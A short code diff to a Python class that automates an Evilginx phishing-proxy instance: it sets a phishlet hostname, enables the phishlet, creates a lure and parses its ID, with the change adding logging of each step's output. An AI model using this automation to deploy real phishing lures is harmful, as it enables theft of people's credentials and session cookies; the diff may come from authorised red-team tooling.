@@ -300,9 +300,12 @@ class InstanceManager:
 
         try:
             resp = proc.send(f"phishlets hostname {phishlet_name} {phishlet_hostname}")
-            resp += proc.send(f"phishlets enable {phishlet_name}")
+            logger.info("phishlets hostname output: %s", resp[-200:])
+            resp = proc.send(f"phishlets enable {phishlet_name}")
+            logger.info("phishlets enable output: %s", resp[-200:])
             # lure create + get-url
             lout = proc.send(f"lures create {phishlet_name}")
+            logger.info("lures create output: %s", lout[-400:])
             m = LURE_ID_RE.search(lout)
             if not m:
                 raise EvilginxError(f"lure id not found in output: {lout[-400:]!r}")
